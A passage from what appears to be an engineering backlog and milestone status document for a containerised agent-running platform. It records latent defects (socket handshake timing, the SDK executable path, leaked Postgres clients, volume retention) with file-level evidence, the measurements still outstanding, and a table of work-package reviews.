  started from TypeScript (`packages/infrastructure/src/workspace/provider.ts:697-705`), plus
  `egress: alpine:3.21` with `egressCommand: ['sleep','600']` (`docker-workspace.ts:274-280`). The bind mount
  is *"the one thing technical/05 says a run container never has"*, named as a hole in
  `packages/infrastructure/src/workspace/hardening.ts:11-23`.
- **The handshake and what it closed** (WP-15g, measured before the check existed): `create` returns when
  the container has *started*, the shim then boots Node and `listen()`s, and a runner that connects
  immediately gets `connect ENOENT` on a healthy workspace, **8 ms in**, reported as `Failed to spawn Claude
  Code process`. With Q59(a) in place each occurrence costs **one failed `runs` row and one 30 s retry per
  task**; without the wait *and* without Q59(a) it was the first run of every task. The wait is
  `#waitForControlSocket` (`provider.ts:785`), called from `attach` at `:774`, bounded by
  `CONTROL_SOCKET_TIMEOUT_MS = 30_000` at `CONTROL_SOCKET_POLL_MS = 50` (`:144-145`), throwing
  `workspace_failed`, which `classifyProvisionFailure` treats as retryable.
- **The unit half is calibrated and the e2e half is not.** `packages/infrastructure/src/workspace/provider.test.ts`
  › *"waits for a shim that starts listening after attach was called"* drives a late-booting shim and kills
  the mutant by name (unmutated 38/38; before that case existed, shortening the loop to one look left
  **37/37 green**). **Needs measurement** (rule 66, not run here): whether the *e2e* attach case kills the
  same mutant. In that file `create` → `relaxControlDirectoryForHost` → `attach` may already leave the socket
  present by the time `attach` runs, in which case the case certifies the happy path and not the wait. One
  mutation of `#waitForControlSocket` plus that one file answers it, and no image is needed to find out.

**What it costs to leave.** The defect the handshake closed is a first-run failure per task, and its only
calibrated guard is a unit test with a fake engine. WP-22 changes the timing in exactly the direction that
matters: with the real `platform-runtime` image, `runtimeSourceDir` is unset, the shim starts from the
image's own entrypoint rather than from `node --import ts-source-resolver` over a bind mount, and the gap
between "container started" and "socket listening" is a different quantity — measured by nothing.

**What "done" looks like.** Two things, and they are independent. (1) The measurement above, recorded here or
on the row: does the existing e2e case kill the one-look mutant? (2) The criterion now on **WP-22**, which is
where the real images arrive.

**A second measurement this entry cannot resolve, and it is about the local tier rather than the code.**
WP-15g measured that the shim **refuses to start** on a bind-backed control volume — it `chmod 0600`s its
socket after binding and `chmod` on a socket there answers `EINVAL: invalid argument, chmod '/ctl/ctl.sock'`
on this machine — and this fixture is bind-backed **by default** (`docker-workspace.ts:255-266`; only
`scripts/runlet-launcher-check.mjs:76` passes `controlVolumeBind: false`). WP-15g also reports
`PASS: verify:e2e (83)` from this machine. Those two statements cannot both be complete: either the local run
does not include this file's 40 cases, or the shim does boot here and the EINVAL is narrower than recorded.
**Needs measurement** (rule 66, not run here): which. Until it is answered, **Linux CI is the tier of record
for the real provider**, not `verify:e2e` in the orchestrator's shell — and any future "the real `attach` is
covered" claim should name the run id, as the evidence above does.

**Depends on / owner.** The images are **WP-22**'s and the criterion is on its row. The mutation measurement
is owned by nobody and needs no image.

### 34. **The SDK computes the CLI's path on the platform side and the shim executes it in the container, so the first real agent run in the real image execs a path that is not there** (TODO — latent, **no work package owns it**; found by WP-22)
**What is wrong.** `Options.pathToClaudeCodeExecutable` is `null` outside `local` mode, so the SDK resolves
its **own bundled** binary and passes that path as the spawn command; the run container's binary is
`/usr/local/bin/claude`. The two are different paths on two different filesystems, and nothing compares them.

**Evidence** (WP-22 implementer, session 5, discovered work; read from the SDK bundle rather than run). The
`existsSync` check that would have caught it is on the branch that spawns **locally** — the shape is
`if (spawnClaudeCodeProcess) … else spawnLocalProcess` — so the override path does **not** validate the path
here. Consequence, stated as it was measured: the mismatch surfaces as an **exec failure inside the
container**, not as a clear error on the platform side. **Nothing has run a real agent through the real
image**: WP-15g scoped it out, and no WP-22 criterion needs it.

**Is it a defect or a gap?** A defect, but a **latent** one with a named trigger: it fires on the first run
that composes a real `RunWorkspaceProvisioner` against `platform-runtime`. Today the provisioner is absent by
default and `unavailableClaudeRunner` throws first, so nothing can reach it — which is exactly why it will be
found by whoever is debugging their first container run, at the worst moment.

**What done looks like.** One field: the workspace spec sets `claudeCodePath` to the run image's path, and a
case asserts the **bytes the CLI received** rather than the spec (rule 82) — the same discipline WP-15g's
criterion 1 used. **A wrong path must fail by name on the platform side**, not as a container exec error,
because the whole cost of this finding is the diagnosis rather than the fix.

**Whoever takes it also gets a 217 MB saving, and it is a second decision rather than a freebie.** If the
platform side never needs the binary, `@anthropic-ai/claude-agent-sdk-linux-*` can leave the product and
launcher images — the difference between **1.1 GB and ~900 MB**, against WP-22's measured product image of
**1.1 GB**. Do not drop the dependency before the path fix is proved by a real run: removing it makes the
current (broken) default fail differently rather than better.

**Depends on / owner.** **None** — WP-15g composed the runner and scoped the real image out, WP-22 built the
image and scoped the runner out, and the seam between them is this entry. It needs a daemon and the real
images, so it cannot be a `verify` target; it belongs beside WP-14's docker workspace e2e or
`scripts/runlet-launcher-check.mjs`, whichever the taker is already running.

### 30. **A leaked `pg.Client` still ends the process on a forced drop, and nothing refuses a leak** (TODO — the half of backlog **28** that a census cannot cover)
**What is wrong.** Backlog 28 closed the **pool** half: every pool comes from one of two factories, both
attach an `error` listener, and a census refuses a third construction site. A bare `pg.Client` sits outside
that guarantee, and where it is safe it is safe for a *different* reason — `Client.end()` resolves on the
connection's `end` event, so a client the caller **closed** is genuinely closed. A client the caller
**leaks** is still attached when the harness drops its database `with (force)`; the `57P01` then arrives as
an `'error'` on an `EventEmitter` nobody listens to, which is a process death of exactly the shape standing
rule **85** names. Twelve clients are safe today because a `finally` or an `afterAll` ends them, and nothing
refuses the edit that moves one.

**Evidence** (backlog 28's implementer, session 5; measured against the tier's own PostgreSQL 18 container,
full note under `## WP notes — session 5`). Quoted from the discovered-work bullet rather than paraphrased:

> `Client.end()` resolves on the connection's `end` event, so a closed client is genuinely closed —
> but a *leaked* one still takes the process down when its database is dropped with `(force)`, and
> nothing refuses a leak. Twelve bare-client sites in `test/` rely on a `finally`/`afterAll` that a
> future edit could drop. A census like the pool one would need to prove “every client is ended”,
> which is a dataflow question rather than a grep, so it is filed rather than done.

**The twelve, listed** so the next reader does not re-derive them (refiner, session 5, grep only — rule 66):
nine files, twelve `new pg.Client(` sites —
`test/integration/support/postgres.ts:140` and `:180`;
`test/integration/pipeline/postgres-pipeline-store.integration.test.ts:26` and `:54`;
`test/integration/knowledge/nul-refusal.integration.test.ts:46` and `:85`;
`test/integration/knowledge/postgres-knowledge-store.integration.test.ts:41`;
`test/integration/knowledge/context-pack.integration.test.ts:68`;
`test/e2e/pipeline/context-pack.e2e.test.ts:47` and `:77`;
`test/e2e/pipeline/composition.e2e.test.ts:237`;
`test/e2e/support/instance.ts:175`.
The two **production** bare clients are accounted for and are not part of this:
`packages/infrastructure/src/broadcast/postgres-broadcast.ts:309` exposes the `onError` seam the
`NotificationClient` wires, and `packages/infrastructure/src/db/migrator.ts:97-98` ends its client in a
`finally` (`:281-289`). The migrator's client carries **no** `error` listener, though — **hypothesis**
(rule 39), not measured: a failover or a `pg_terminate_backend` during a migration would end the migrate
container on an uncaught error rather than a typed one.

**What it costs to leave.** Nothing today: all twelve sites do end their client, so this is **latent**
rather than live and the trigger is an edit — a thirteenth site, an `await client.end()` moved out of a
`finally`, a `return` added above one. What it costs *then* is backlog 28 again: a red `e2e-fake-claude`
with every test in it green, which took a session, a measurement round and a rejected push to diagnose.
The census that exists would not say a word, because it allows exactly two **pool** factories and makes no
claim about clients.

**What done looks like.** The harness **owns the lifetime**, which turns the dataflow question into the
grep the pool census already is. Two parts, and the second is what makes it a guard rather than a
convention: (1) a `withClient` helper beside the existing ones in `test/integration/support/postgres.ts`
that connects, runs the body and ends the client in a `finally`, with the twelve sites moved onto it;
(2) one more refusal in `packages/infrastructure/src/db/pool-errors.test.ts` — or a sibling census in the
same shape — naming any `new pg.Client` under `test/` outside that helper. Calibrate it the way the pool
census was: plant a bare client **tracked** and **untracked** and expect both named. That census already
walks both sets, which is the reason to extend it rather than write a new one; the case to copy is
`packages/infrastructure/src/db/pool-errors.test.ts` › "names a planted pool whether it is tracked or merely untracked, and skips an ignored one"

**Needs measurement** (rule 66, not run here). The bullet states the leaked-client failure as measured, but
session 5's measurement 2 held its idle client **in a pool** and the delivery path it traced ends at
pg-pool's `makeIdleListener`. Whoever writes the failing case should expect to re-derive the bare-client
path: that a connected `pg.Client` with no `error` listener, and no pool anywhere, raises `57P01` as an
uncaught exception when its database is dropped `with (force)`. If it does not, this entry shrinks to a
convention and the helper is still worth having for the twelve sites.

**Depends on.** Nothing; the census it extends is in the tree. **Owner: none** — no work package owns the
integration/e2e harness, the same gap entry **28** records. Cheapest for whoever next touches
`test/integration/support/postgres.ts`, and before **WP-22** leans on this tier for its images.

### 21. **A module-graph cycle that only bites at a particular import order** (nit, TODO)
**What is wrong.** A static `import pg from 'pg'` placed **before** the harness import in an e2e file makes
`createEventing` throw **`EventBus is not a constructor`** — `packages/infrastructure/src/events/index.ts:82`
is the `new EventBus({` that fails. Reordering the imports, or `await import('pg')`, makes it go away.

**Evidence** (WP-15d implementer, in passing). Hit in a throwaway e2e file and worked around there with
`await import('pg')`. **Nothing in the repository does it today, and nothing stops the next file from doing
it.** Not diagnosed further: *which* module pair forms the cycle is unestablished and is the first thing
whoever takes this has to find. **Hypothesis, labelled one** (rule 39): an ESM cycle through the
`@platform/*` entry points in which the `EventBus` binding is still in its temporal dead zone when the
eventing index's factory runs under one evaluation order and not under the other.

**What it costs to leave.** An hour, maybe a session. The failure **names the wrong component entirely** —
an `EventBus` that is fine, and a `pg` import that looks unrelated to it — which is standing rule 56's shape
(*a test that reads the wrong signal blames the wrong component*). Nothing is wrong in production; this is a
trap laid for the next author of an e2e file, and the order that springs it is the order a formatter or an
import-sorter might produce on its own.

**What done looks like.** The cycle is **named** — a graph pass (`madge`/`dpdm` style) or the pair found by
hand — and then either broken, or written into the e2e harness's docblock as the import rule it demands, so
the next author meets a sentence instead of a `TypeError`. A one-line note is an acceptable close here; an
undiagnosed workaround copied into a second file is not.

**Needs measurement** (rule 66, not run here): the reproduction itself. It was observed once, by one agent,
in a file that no longer exists, and no test pins it.

**Depends on.** Nothing. **Owner: none** — no work package owns the module graph. Cheap enough to fold into
any WP that touches `packages/infrastructure/src/events/` or `test/e2e/support/`.

### 6. Two nits from WP-14's final round
- A citation line ending in `,` continues, so ordinary quoted prose on the next line becomes an invented
  cited name. It fails **loudly**, and the grammar section states the constraint, so it is acceptable —
  noted for the day a writer hits it.
- Merge `b469ff2` rewrote 7 comment lines in `test/e2e/support/docker-workspace.ts`, a file `main` never
  had, *inside a merge commit* — invisible to a default `git log -p`. The text is accurate. This is the
  `d1e7b69` class in miniature: **the orchestrator's own merges are the least reviewed changes here.**

### 9. **`commitlint` cannot run in a worktree that has no `pnpm install`** (nit)
`sh: ./node_modules/.bin/commitlint: No such file or directory`, `exit status 127`, commit rejected
(same measurement as entry 8). It **fails closed**, so it is a nit and not a gate defect — but a
fresh worktree cannot commit at all until `pnpm install` has run in it, and the orchestration
protocol tells every future session to use worktrees. One line in `CONTRIBUTING.md`, or a hook that
resolves the binary from the repository root rather than from `$PWD`.

### 7. Carried, not yet scheduled
- **Needs measurement (WP-18b, one test): the knowledge apply job's idempotency has never been driven
  twice.** Nothing is known to be wrong — this is a claim asserted less strongly than it reads (rule 44).
  The keys `knowledge_commit:<branch>` and `knowledge_mr:<branch>` go through the same `IdempotencyPlan`
  machinery the ticket writes use, and `applyKnowledgeProposals` is called exactly once per batch in every
  tier, so a second call has never happened. The implementer left the recipe and it should not be
  re-derived: *“re-deliver the `knowledge.apply` job through `ServerRuntime.jobs` (the labelled seam WP-15d
  added for exactly this) after a successful pass and assert one commit, not two.”* Trigger: any change to
  the batch's branch naming — the discriminator is the batch's earliest proposal id, so a change there is a
  change to the idempotency key. Cost of leaving it: a retried apply that commits the same pages twice
  would be discovered on a customer's repository rather than in a tier.
- **Q55** — the binding redactor cannot know a run-scoped credential, so `getJobLog`'s obligation is not
  dischargeable as written. WP-15a or WP-16 must compose the redactor **per run**. The CI gate returns
  failing job *names* until it is closed, and `gates.test.ts:167` pins that so closing it is deliberate.
- **Q56** — a custom stage cannot return, because no bounded loop counts it. Recommendation filed (refuse
  loudly); the reviewer agreed with rejecting "borrow `ci_fix`'s budget".
- ~~**WP-22 owes two measured things**~~ — **both discharged at WP-22, and the first claim was falsified**
  (refiner, session 5; rule 39 — a wrong claim attached to a true obligation).
  ~~`renderEgressConfig` writes `User nobody` while the sidecar runs uid 1000 with `cap_drop ALL`, so
  tinyproxy cannot setuid and the rendered config **will not start the real image as written**~~ —
  **measured against tinyproxy 1.11.2, as uid 1000 with `cap_drop ALL` and both lines present: it starts,
  stays up, proxies to an allowed host (200), refuses a filtered one (403, "Proxying refused on filtered
  domain"), and does not even warn.** The prediction was made by reading the documentation, not by running
  the binary. **The lines were removed anyway, for the reason that survives** (rule 3): the process does not
  honour them, so they are a claim about this container that nothing enforces, and a trap for the day
  somebody starts the sidecar as root. `FilterExtended On` became `FilterType ere` — the same setting under
  the spelling the pinned binary asks for. The **second** obligation is done: `apps/runlet` is bundled to one
  file and the shim in the image is the bundle (349 kB, no `node_modules`), and the container check was
  re-run against the real image — `docs/research/12-run-shim-verification.md:230-239` records
  `RUNLET_CHECK_RUNTIME_IMAGE=platform-runtime:dev node scripts/runlet-container-check.mjs` at **7/7
  passed, 7.8 s**. Full measurement under "WP-22 — images and compose".
- **Nit (WP-22, one line).** `imageTagsOf` in the e2e support file derives what to `docker pull` from the
  provider's image record and pulls nothing today, because `platform-*` tags are refused there with the build
  command. A future `WorkspaceImages` field that is a string but not a tag would be **pulled rather than
  rejected**; the comment at the filter says so and nothing enforces it. Cost of leaving it: a test tier that
  silently reaches a registry. Trigger: a new field on that record.
- **Nit (WP-22, one line): the class behind the `@platform/prompts` crash is one step wider than its guard.**
  The instance is **closed** — `packages/prompts` declared no dependencies and imported `@platform/contracts`,
  which resolved through the root in a developer checkout and was `ERR_MODULE_NOT_FOUND` under
  `pnpm install --prod` in the product image — and `scripts/workspace-deps.test.ts` is the class guard. What
  it does not cover is **third-party** specifiers (`zod`, `pino`), which resolve from the root in every
  arrangement this repository ships today; an undeclared one behaves exactly like `@platform/contracts` did.
  Trigger: publishing a package, or a stricter `node_modules` layout. Nothing is wrong today.
- **`retentionDecision` keeps an unlabelled volume for ever by design** (rule 60), and one `verify:e2e` run
  produces exactly one unlabelled `ws-<uuid>`. The e2e sweep was fixed; the production half is a decision
  (a reserved prefix, or an orphan report), not a code change to make quietly.
  - **Third instance, session 5, harness — and it appears only when a run is killed.** WP-14a's
    implementer reported `agentic-e2e-{cache,ctl}-*` volumes left behind by full e2e runs; the
    orchestrator's own completed runs returned to baseline (18563 → 18563), and the round-2 reviewer
    read the mechanism: `test/e2e/support/docker-workspace.ts` creates those two volumes with
    `docker volume create` and **no labels** and removes them **by name** in `afterAll`, so a run that
    completes leaves nothing and a run killed before `afterAll` — the harness killed two of the
    orchestrator's tonight for memory — leaves exactly those two, invisible to rule 60's
    `label=com.agentic.run` sweep. Rule 60's shape (a resource identified only by its name), in the
    harness. **Done** looks like: the fixture sweeps `name=agentic-e2e-` at start (the shape the
    `ws-<uuid>` fix took), or labels the two volumes so the existing sweep sees them. Owner: none —
    whoever next touches the fixture; cheap.
  - **The other half of the same sentence is unimplemented, and it is the opposite failure** (WP-15g's
    discovered work; refiner, session 4 — no new number, because both halves are this one line's).
    technical/05:10 reads *"keep the volume per retention (3 days default, **14 days for
    paused/taken-over**)"*. `buildWorkspaceSpec` writes three days at create time, because at create time
    nothing knows how the task will end (`packages/infrastructure/src/workspace/spec.ts:169,187`), and
    **nothing extends it afterwards**: the label `com.agentic.keep_until` is written only at create
    (`provider.ts:267-272`, `:507-528`) and only read by `retention.ts:48-60` — no path relabels a
    volume. So the bullet above
    over-retains (an unlabelled volume, for ever) and this one under-retains (a taken-over workspace, purged
    on day 4 with the human's work in it); one function, two decisions, different owners. **Owner: WP-27**
    (M2, "steer + take-over/hand-back (export, resume instructions)") — the extra eleven days exist for the
    export path, so the extension belongs with the code that knows a task was taken over, and a create-time
    guess cannot know it. Trigger today: nothing, because no path pauses or hands over a run yet.
  - **A second instance of the same rule-60 class, one level down, and this one is CLOSED** (WP-22; refiner,
    session 5). The bullet above is about the *named* `ws-<uuid>` volume a sweep can see and chooses to keep.
    `alpine/git` declares `VOLUME /git`, so every helper container a run makes owned an **anonymous** volume
    that no label sweep could ever see, and `DockerEngine.removeContainer` sent `v=false`. Measured: one
    `verify:e2e` run left **220** empty anonymous volumes on this machine; **6** leaked per e2e case before
    the fix and **0** after; the 227 created that session were removed and the machine's volume count
    returned to the 18 563 it started at. `v=true` removes anonymous volumes and **never** a named one,
    which is what makes it safe beside `ws-<run>`'s retention; `docker/egress.Dockerfile` carries no
    `VOLUME` for the same reason.
    **Hypothesis, not a finding — one leak shape may remain.** The orchestrator observed this machine's
    anonymous-volume count rise by **one** across its own `verify:e2e` run *after* the fix. It is
    unattributed: nobody has named the container that owns it, and the count was read from a machine that
    had other work on it. **Needs measurement** (rule 66, not run here): count anonymous volumes before and
    after a single `verify:e2e` run on an otherwise idle daemon, and if the rise reproduces, name the image
    whose `VOLUME` produced it before changing anything.
- ~~**WP-22 owes a third, smaller thing**~~ — **discharged at WP-22 by the create-time check, which is the
  half this bullet called the better fix** (refiner, session 5). `create` refuses a run whose egress sidecar
  is not running after create, and it caught the exact stand-in predicted here: `runlet-launcher-check.mjs`
  was passing `alpine:3.21` with no command, and the refusal named it — *"the egress sidecar is exited
  (exit 0) after create, so the workspace's HTTPS_PROXY points at a container that is not running (image
  alpine:3.21)"*. The script now passes `platform-egress` and reports `PASS: runlet-launcher-check` at 7/7.
  No companion **variable** was added, deliberately (rule 31): nothing would read one. Original bullet:
  `readLauncherConfig`
  has **no variable** for `WorkspaceImages.egressCommand` (declared `hardening.ts:65`, used as `?? []` at
  `packages/infrastructure/src/workspace/provider.ts:684`; the env list is `apps/launcher/src/config.ts:21-31`,
  which has `APP_WORKSPACE_EGRESS_IMAGE` and no companion command), so a launcher built from the environment
  starts the sidecar with the image's default `CMD`. **This is correct in production and not a defect**:
  `platform-egress`'s entrypoint *is* tinyproxy. It is wrong the moment an operator points
  `APP_WORKSPACE_EGRESS_IMAGE` at a stand-in, which exits immediately and leaves the workspace with
  `HTTPS_PROXY` aimed at a dead container and no message — the e2e passes `egressCommand: ['sleep','600']`
  directly (`test/e2e/support/docker-workspace.ts:277`) because env cannot express it. One variable, or a
  create-time check that the sidecar is still running after `create`; the second is the better fix and is a
  criterion, not a knob.
- **`run_messages.blob_id` is never set: a payload over 1 MB is stored whole** (WP-15g's discovered work).
  technical/03:60 says *"Payloads > 1 MB go to `blobs`"*; `createPostgresTranscriptSink` writes the document
  as-is (`packages/infrastructure/src/runner/postgres-transcript-sink.ts:162,181`). Bounded in practice by
  `toolOutputMaxChars` (10 000 characters head and tail per tool result) and by the SDK's own message sizes,
  so it is a **gap, not a leak**; the trigger is a single assistant message over a megabyte. Whoever writes
  the transcript read API (backlog **29** / WP-15h) has to handle a non-null `blob_id` regardless, or state at
  the line that it cannot occur — a reader written against a column that is null only by accident breaks on
  the day the spill lands.
- **Shadow mode has no e2e**, and **session resume after a runner restart** is unimplemented
  (`docs/TODO.md`).

## Milestone M1 — the loop

| WP | Title | Depends | Parallel-safe | Status | Commit | Notes |
|---|---|---|---|---|---|---|
| WP-00 | Repo scaffold | — | no | DONE | `8852b9e` | 3 review rounds; notes below |
| WP-01 | `packages/contracts` | WP-00 | no | DONE | `dedc4b9` | APPROVE; 5 hardening fixes folded in |
| WP-02 | `packages/domain` | WP-01 | no | DONE | `168d368` | 3 rounds spent; 2 command-policy defects carried to WP-02a |
| WP-02a | Command policy: close the two `allow` routes found at WP-02 round 3 | WP-02 | no | DONE | `8abf247` | 2 rounds; includes the property-test ci-fix |
| WP-04a | Delete the `DrainScheduler` seam; `OutboxWorker` owns its timer | WP-04, WP-05 | no | DONE | `d729616` | TD-004 amended |
| WP-03 | Postgres schema + Drizzle + migrations (technical/03) | WP-00 | no | DONE | `ca1ae06` | 2 review rounds; 2 privilege escalations found and closed |
| WP-04 | Event store + priority dispatcher + outbox job (TD-005) | WP-02, WP-03 | no | DONE | `59817d6` | 3 rounds; every guard mutation-checked |
| WP-05 | Jobs port on pg-boss | WP-03 | no | DONE | `3397924` | 3 rounds; Q38; fake divergence register |
| WP-06 | Fastify server skeleton (TD-002) | WP-04 | no | DONE | `d60d770` | 3 rounds; SSE write-chain defect carried to WP-06a |
| WP-06a | SSE: replay and live frames share the write chain; and the test harness cannot see it | WP-06 | no | DONE | `9e0be0b` | 3 review rounds + a follow-up; **seven** layers of one defect; unblocks WP-12/WP-15 |
| WP-07 | Integration ports + fakes + contract test suites | WP-04 | no | DONE | `b036c4c` | 2 review rounds + a pre-merge fix round; rules 11-14 earned here; unblocks WP-08…WP-11 |
| WP-08 | Jira Cloud provider | WP-07 | yes | DONE | `af206c7` | 2 review rounds + pre-merge fixes; rules 17, 18, 22; shared fixture-provenance suite lives here |
| WP-09 | GitLab provider (gitlab.com + self-managed) | WP-07 | yes | DONE | `27928b2` | 2 review rounds + pre-merge fixes; rules 19, 20, 21, 23, 24; **Q40** is its open question |
| WP-10 | Slack provider | WP-07 | yes | DONE | `fbf0928` | 2 review rounds + pre-merge; rules 29, 30, 33, 34; **Q42** |
| WP-11 | Sentry + Loki providers | WP-07 | yes | DONE | `d066708` | 3 rounds + **WP-11a** (3 more); rules 31, 32, 35–42, 46; **Q43** |
| WP-12 | Claude SDK runner (technical/04) | WP-04, WP-05 | no | DONE | `951e343` | 3 review rounds + pre-merge; rules 15, 16, 26, 27, 28; **Q41**; unblocks WP-13 |
| WP-13 | Run shim `agentic-runlet` (TD-025) | WP-12 | no | DONE | `d1e7b69` | 2 review rounds + pre-merge; rules 43, 49, 50; **Q50, Q51**; unblocks WP-14 |
| WP-14 | Launcher service + `WorkspaceProvider` (docker + fake) | WP-13 | no | DONE | `a810784` | **3 review rounds**; Q52/Q53 needed no renumbering (main reached Q51 then took Q54/Q55). Round 1 found a live container nobody held a handle to and a deny-list of symlinks that never fired; round 2 found `verify` red under a report that said PASS; round 3 shipped `scripts/citations.ts`, which found two defects in itself. Rules 54, 55, 58, 59, 60, 61, 65. |
| WP-14a | **The ten platform skills, and the provisioning step that mounts them** (backlog 24) | WP-14, WP-17 | no | DONE | `dcc1f21` | **2 review rounds + a pre-merge round; CI `34730606133` and `image` `34730606129`, read as `completed success`.** **technical/04's layout was wrong and is amended on a measurement, re-derived by the round-1 reviewer with the pinned binary** (`@anthropic-ai/claude-agent-sdk@0.3.267`, the init message's `skills` field): `.claude/skills/_platform/<n>/SKILL.md` is **not** discovered, nor a parent's `.claude/skills` when the checkout is a git root (the shipped case); a **plugin directory** holding `skills/<n>/SKILL.md` **is**, namespaced `agentic:<n>`, the directory name being the identity. So `create` writes `<checkout>/.agentic-run/plugins/agentic/skills/` from a `skills-<run>` helper inside the launcher, bytes from the **launcher's** `@platform/prompts`, kept out of commits by `.git/info/exclude`; `skillSetVersionOf` folds a digest of the set into `prompt_version`; no image rebuild. The ten `SKILL.md` files have frontmatter `name` equal to the directory, held by a test over the directory read off disk; every provider `skill` ref is real. **Role table** (`SKILLS_BY_ROLE`, enumerated): triager none; PM and architect `ask-human`, `kb` (+`jira-ticket`); investigator adds `loki-logs`, `sentry-issue`; developer nine; reviewer, acceptance tester, librarian, discovery `kb`; facilitator `kb`, `retro`. **Q67 filed and implemented, product/13 amended by the orchestrator**: the platform's list *replaces* project-skill discovery, because BD-025 trusts `.claude/` only from the default branch and a re-entry checks out the task branch. Tier 2 in a real container against `platform-runtime:dev`: byte for byte, the project's own `.claude/skills` untouched, the checkout clean, only the role's skills — mutation-calibrated; tier 3 scoped out. **Both review rounds were the same finding, and it is rule 86 inside prompt material**: seven sentences across the skills stated runtime facts that are false in this build — a credential no run has (`agentRunEnvironment` injects only `ANTHROPIC_API_KEY` and nothing reads `AgentTooling.env`; backlog **40**), a context directory nothing writes, an MCP server that is not mounted, a question timeout `ask_human` refuses today. All hedged to what is true, and `test/contract/prompts/platform-skills.contract.test.ts` now refuses a credential claim, requires a skill naming a run-image CLI to be backed by a provider's tooling **or** to carry the hedge (`acli`, `jira` and `sentry-cli` are in the image while Jira and Sentry declare none), and holds path and server claims the same way, its residual stated (a claim about a platform tool, event or pipeline behaviour is still unguarded). Minor: the role table's docblock records its three mismatches with product/13 (backlog **39**). Filed by the refiner: **39** (the investigator has no `Bash`), **40**, **41** (`sentry-cli` 3.7.0 contradicts the provider's cited docs); backlog **24 RESOLVED** on the measured layout; the e2e fixture's two unlabelled named volumes leak only when a run is killed (on rule 60's bullet). **The machine got a third vote during this row**: the orchestrator's wait loop was killed for low memory and its detached e2e died with it; cleaned and rerun green. |
| WP-15 | Pipeline interpreter + stage executor + sagas (technical/02) | WP-04…WP-12 | no | DONE | `79582c6` | 2 review rounds. The e2e is **proved**: stubbing `transition()` reddens 3 of 4. Four product defects only the loop could find. Round 1 found two live branches no test ran, one failing **open**. Rules 67, 68. Cuts: spike template, librarian stage, CI error block (Q55), probation mode, `command` gates (fail-closed). |
| WP-15a | **Compose the pipeline into `apps/server`** — binding loader + registration + e2e on a real server instance | WP-15 | no | DONE | `be05a9b` | **4 rounds + an architect ruling.** The honest claim is narrower than the row: *the pipeline is composed and production does not start it* — `main.ts` passes no runner and no audit log, and there is no webhook ingress, both filed. A feature and a bug ticket reach `task.completed` through an `apps/server` instance the e2e starts, from seeded rows; deleting the bindings inserts parks all five at `ci_gate`. Found: the **fifth fail-open gate** (a project with no git binding settled CI `passed: true`, which had invalidated round 1's own falsification), an instance with no pipeline **eating** a `ticket.matched` while `/readyz` read ok, and **no credential broker existing at all** — so it also brings a `SecretStore` and an AES-256-GCM envelope. Rules 73, 74, 75; Q55's mechanism closed, its product cut stands. |
| WP-15b | **Postgres `IntegrationAuditLog` + `IdempotencyStore` + migration 0013** | WP-15a | no | DONE | `31abfc6` | 1 review round. `startRuntime()` composes a real audit log with **no caller able to supply one** (the field is gone from `PipelineComposition`); the composed-log→no-op mutation fails the e2e with `expected 0 to be greater than 0`, so the dependency is **used**, not merely supplied (rule 35). `redaction_count` asserted in **both** directions (rule 42); counters `not null` with the **default dropped**, so an omitted one errors rather than recording a zero (rule 18). **FK on `integration_actions` dropped** — a log of external facts must not be gated on internal referential state; deferral cannot help because the audit transaction commits **before** the saga's. Zero readers today, so technical/03 carries the `LEFT JOIN` sentence the first one will need. Pool floor recomputed: only the audit connection is concurrency-proportional (both job workers call providers *outside* their transactions), poolMax 10 → 13, and the test asserts the **shape** (+6 for N 1→3) so a flat reservation fails. Round 1 found the idempotency invariant asserted by **nothing** on Postgres while the fake *was* held to it — rule 1 inverted. |
| WP-15d | **Move the provider calls out of the handlers' transactions** — the shape under both of WP-15b's symptoms | WP-15b | no | DONE | `8ae121c` | 1 review round (APPROVE) + a pre-merge round for three false claims. **Backlog 17, closed.** The three sites now *decide* in the handler and *call* from a `pipeline.outbound` job enqueued through `afterCommit`; the refusal is a runtime fact — `events/open-transaction.ts` marks the handler path in `EventBus` and the job path in `createPipelineRuntime`, and `integrations.ts` refuses **both** to resolve a project's bindings and to make the call while a scope is open, so the next handler to try it fails a named test rather than a production pool. Deleting any one of the three refusals kills **exactly one** named test with the other two green — re-derived by the reviewer on copies, calibrated 3/3 unmutated (rules 21, 41). Door completeness checked over the **set**: all 7 direct `.port.*` calls in the repository sit inside the guarded `read`/`mutate` (rule 68). **The hypothesis is now a measurement**, at the shipped defaults and without generating load (rules 39, 64): N=10 concurrent intakes at 250 ms per git read delayed an unrelated event by **5 464 ms** before and **63 ms** after (load 4.1/6.0), and a read held open indefinitely stopped every other project's dispatch entirely before (20 s budget exhausted) and does not now — at `APP_DISPATCH_MAX_CONCURRENCY=1` the single dispatch slot was sitting inside `pipeline.intake` waiting on HTTP. Residual stated: the outbound worker is serial, so provider *throughput* is unchanged; what moved is that it no longer happens inside the dispatcher. `auditPerDispatch` is **0** — the receipt. The floor was **recomputed, not reverted**: `2×1+1+2+3+2+1 = 11`, the same number WP-15b reached by a different route (`2N+9` against `3N+8` — they agree at N=1 and diverge above it, 17 against 20 at N=4), so `APP_DB_POOL_MAX` stays **13** with two of slack; my instruction to revert it to 10 was refused with the arithmetic, correctly (rule 27, seventh instance). Moving the writes out **created** a lost update and found the class: backlog **18**. |
| WP-15c | **Webhook ingress + the `inbox`, and the inbound redaction door** | WP-15b, WP-08, WP-09 | no | DONE | `38ea686` | 1 review round (APPROVE) + a pre-merge round, and **an architect ruling taken before the first `delivery_id` was written**. **Production can start a ticket.** `webhook-ingress.e2e.test.ts` › *"starts a ticket nothing seeded and drives it to task.completed"* — a signed delivery to a running `apps/server` instance, **no seeded row**. The ingress asks four questions in order (which binding · is it authentic · which delivery · what does it mean), `verify` runs over the bytes **as they arrived** and `normalise` runs **outside any transaction**; one transaction then writes the `inbox` row and appends its events. That is a **deliberate deviation from technical/06**, which had the work happen in a job and so could lose a delivery it had already recorded as performed — the doc is amended with the reason **and** with the sweep-shaped alternative it was weighed against (rule 8: amend the doc, then point at it). **The ruling is implemented, not merely recorded**, and its real finding is closed: `inbox(headers, payload)` had carried raw deliveries since `0005_events.sql:113`, TD-012's write list never named the table, and **GitLab's legacy scheme sends the binding's own webhook secret as plaintext in `X-Gitlab-Token`** — so migration **0014** adds `redaction_count` and `verified`, both columns are stored redacted *after* `verify` and *after* the key is computed, the verdict is **persisted** because a redacted payload cannot be re-verified, and an integration test reads the row back out of PostgreSQL and asserts the credential is not in it. `redaction_count` is the **summed** count over all three redactions, pinned exactly by `toBe(2)`/`toBe(3)`, so a headers-only count fails — the dead-signal failure the ruling named. **Backlog 20 discharged by the next work package after the one that created it**: a matched ticket with no 